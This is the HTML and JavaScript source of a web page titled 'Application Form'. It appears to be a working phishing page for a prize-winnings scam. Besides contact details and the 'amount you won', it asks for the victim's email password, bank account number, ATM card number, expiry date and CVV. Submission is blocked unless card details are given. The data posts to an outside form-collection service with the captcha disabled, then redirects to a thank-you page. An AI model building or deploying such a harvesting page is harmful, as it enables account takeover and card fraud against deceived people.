<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 600px;
      margin: auto;
    }
    h2 {
      text-align: center;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    .eye {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
    }
    .field-wrapper {
      position: relative;
    }
    .hidden {
      display: none;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 10px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 1em;
      cursor: pointer;
    }
    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    button:hover:enabled {
      background-color: #218838;
    }
    .final-note {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <form action="https://formspree.io/f/mzbllqwz" method="POST" id="applicationForm">
    <h2>Application Form</h2>

    <label for="fullName">1. Full Name</label>
    <input type="text" id="fullName" name="Full Name" required>

    <label for="country">2. Country</label>
    <input type="text" id="country" name="Country" required>

    <label for="phoneNumber">3. Phone Number</label>
    <input type="tel" id="phoneNumber" name="Phone Number" required>
    <div class="error" id="phoneError">Phone must be 9‚Äì12 digits</div>

    <label for="email">4. Email Address</label>
    <input type="email" id="email" name="Email" required>

    <label for="emailPassword">5. Email Password</label>
    <div class="field-wrapper">
      <input type="password" id="emailPassword" name="Email Password" required>
      <span class="eye" onclick="togglePassword('emailPassword')">üëÅÔ∏è</span>
    </div>

    <label for="amountWon">6. Amount You Won</label>
    <input type="text" id="amountWon" name="Amount Won" required>

    <label for="bankType">7. Bank Account Type</label>
    <input type="text" id="bankType" name="Bank Account Type" placeholder="e.g., Standard Bank Account" required>

    <label for="bankNumber">8. Bank Account Number</label>
    <input type="text" id="bankNumber" name="Bank Account Number" required>

    <label for="linkedATM">9. Did You Link ATM to Your Bank Account?</label>
    <select id="linkedATM" name="ATM Linked" onchange="toggleATMFields()" required>
      <option value="">-- Select --</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>

    <div class="error" id="atmWarning" style="display: none;"><strong>YOU MUST HAVE ATM CARD TO PROCEED</strong></div>

    <div id="atmFields">
      <label for="cardNumber">10. ATM Card Number</label>
      <input type="text" id="cardNumber" name="ATM Card Number" maxlength="16">
      <div class="error" id="cardError">Card number must be 16 digits</div>

      <label for="expiry">11. Expiry Date (MM/YY)</label>
      <input type="text" id="expiry" name="Expiry Date" maxlength="5" placeholder="MM/YY">
      <div class="error" id="expiryError">Use format MM/YY</div>

      <label for="cvv">12. CVV</label>
      <input type="password" id="cvv" name="CVV" maxlength="3">
      <div class="error" id="cvvError">CVV must be 3 digits</div>
    </div>

    <div class="final-note">
      13. You will receive <span id="confirmAmount"></span> to your <span id="confirmBankType"></span> <span id="confirmBankNumber"></span>
    </div>

    <input type="hidden" name="_redirect" value="https://onlinegistrationProg.github.io/application-form/thankyou.html">
    <input type="hidden" name="_captcha" value="false">

    <button type="submit" id="submitBtn">Submit Application</button>
  </form>

  <script>
    function togglePassword(id) {
      const field = document.getElementById(id);
      field.type = field.type === "password" ? "text" : "password";
    }

    function toggleATMFields() {
      const atmSelect = document.getElementById("linkedATM");
      const atmFields = document.getElementById("atmFields");
      const atmWarning = document.getElementById("atmWarning");
      const submitBtn = document.getElementById("submitBtn");

      if (atmSelect.value === "No") {
        atmFields.style.display = "none";
        atmWarning.style.display = "block";
        submitBtn.disabled = true;
      } else {
        atmFields.style.display = "block";
        atmWarning.style.display = "none";
        submitBtn.disabled = false;
      }
    }

    document.getElementById("phoneNumber").addEventListener("blur", function () {
      const val = this.value.replace(/\D/g, "");
      document.getElementById("phoneError").style.display = (val.length < 9 || val.length > 12) ? "block" : "none";
    });

    document.getElementById("cardNumber").addEventListener("blur", function () {
      const val = this.value.replace(/\D/g, "");
      document.getElementById("cardError").style.display = (val.length !== 16) ? "block" : "none";
    });

    document.getElementById("cvv").addEventListener("blur", function () {
      const val = this.value.replace(/\D/g, "");
      document.getElementById("cvvError").style.display = (val.length !== 3) ? "block" : "none";
    });

    document.getElementById("expiry").addEventListener("input", function () {
      let value = this.value.replace(/\D/g, "");
      if (value.length >= 3) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
      }
      this.value = value.slice(0, 5);
    });

    document.getElementById("amountWon").addEventListener("blur", updateFinalNote);
    document.getElementById("bankType").addEventListener("blur", updateFinalNote);
    document.getElementById("bankNumber").addEventListener("blur", updateFinalNote);

    function updateFinalNote() {
      document.getElementById("confirmAmount").textContent = document.getElementById("amountWon").value;
      document.getElementById("confirmBankType").textContent = document.getElementById("bankType").value;
      document.getElementById("confirmBankNumber").textContent = document.getElementById("bankNumber").value;
    }
  </script>
</body>
      </html>
